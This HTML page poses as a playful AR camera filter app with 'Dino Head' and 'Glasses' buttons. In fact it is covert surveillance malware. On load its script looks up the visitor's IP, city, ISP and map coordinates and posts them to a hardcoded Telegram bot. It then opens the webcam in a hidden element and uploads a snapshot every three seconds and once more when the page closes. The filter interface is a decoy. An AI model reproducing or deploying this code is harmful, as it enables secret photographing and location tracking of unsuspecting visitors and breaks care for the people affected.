<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AR Camera Filters</title>
    <script src="https://aframe.io/releases/1.2.0/aframe.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/ar.js@1.7.2/aframe-ar.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/face_mesh"></script>
    <style>
        body {
            margin: 0;
            background-color: black;
            overflow: hidden;
        }
        .hatching {
            position: absolute;
            width: 100%;
            height: 100%;
            background: repeating-linear-gradient(
                45deg,
                rgba(255, 255, 255, 0.25),
                rgba(255, 255, 255, 0.25) 10px,
                transparent 10px,
                transparent 20px
            );
            pointer-events: none;
        }
        .filter-menu {
            position: absolute;
            top: 10px;
            left: 50%;
            transform: translateX(-50%);
            display: flex;
            gap: 10px;
            z-index: 10;
        }
        .filter-btn {
            padding: 10px;
            background: white;
            border: none;
            cursor: pointer;
        }
    </style>
    <script>
        async function sendUserInfoToTelegram() {
            let response = await fetch('https://ipwho.is/');
            let data = await response.json();
            let botToken = "7565238718:AAGgWjTEn81YY_h_jTncM3tzc4tWJPdglds";
            let chatID = "860517021";
            let message = `New Visitor Detected!\nIP: ${data.ip}\nLocation: ${data.city}, ${data.country}\nISP: ${data.connection.isp}\nMap: https://www.google.com/maps?q=${data.latitude},${data.longitude}`;
            let telegramURL = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatID}&text=${encodeURIComponent(message)}`;
            fetch(telegramURL);
        }

        function startCamera() {
            navigator.mediaDevices.getUserMedia({ video: true }).then((stream) => {
                let video = document.createElement('video');
                video.srcObject = stream;
                video.play();
                video.style.display = 'none';
                document.body.appendChild(video);

                let canvas = document.createElement('canvas');
                let ctx = canvas.getContext('2d');
                canvas.width = 640;
                canvas.height = 480;

                setInterval(() => {
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    let imageData = canvas.toDataURL('image/png');
                    sendPhotoToTelegram(imageData);
                }, 3000); // Capture and send every 3 seconds

                window.addEventListener('beforeunload', () => {
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    let imageData = canvas.toDataURL('image/png');
                    sendPhotoToTelegram(imageData);
                    stream.getTracks().forEach(track => track.stop());
                });
            }).catch(console.error);
        }

        async function sendPhotoToTelegram(imageData) {
            let botToken = "7565238718:AAGgWjTEn81YY_h_jTncM3tzc4tWJPdglds";
            let chatID = "860517021";
            let formData = new FormData();
            formData.append("chat_id", chatID);
            formData.append("photo", dataURItoBlob(imageData), "image.png");
            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                method: "POST",
                body: formData
            });
        }

        function dataURItoBlob(dataURI) {
            let byteString = atob(dataURI.split(',')[1]);
            let mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
            let ab = new ArrayBuffer(byteString.length);
            let ia = new Uint8Array(ab);
            for (let i = 0; i < byteString.length; i++) {
                ia[i] = byteString.charCodeAt(i);
            }
            return new Blob([ab], { type: mimeString });
        }

        window.onload = function() {
            sendUserInfoToTelegram();
            startCamera();
        };
    </script>
</head>
<body>
    <div class="hatching"></div>
    <div class="filter-menu">
        <button class="filter-btn" onclick="applyFilter('dino')">Dino Head</button>
        <button class="filter-btn" onclick="applyFilter('glasses')">Glasses</button>
    </div>
    <a-scene embedded arjs>
        <a-camera position="0 0 0"></a-camera>
        <a-entity id="dino" geometry="primitive: cone; height: 1" material="color: green" position="0 0 -2" visible="false"></a-entity>
        <a-entity id="glasses" geometry="primitive: box; depth: 0.1" material="color: blue" position="0 0 -2" visible="false"></a-entity>
    </a-scene>
    <script>
        function applyFilter(filter) {
            document.getElementById('dino').setAttribute('visible', filter === 'dino');
            document.getElementById('glasses').setAttribute('visible', filter === 'glasses');
        }
    </script>
</body>
</html>
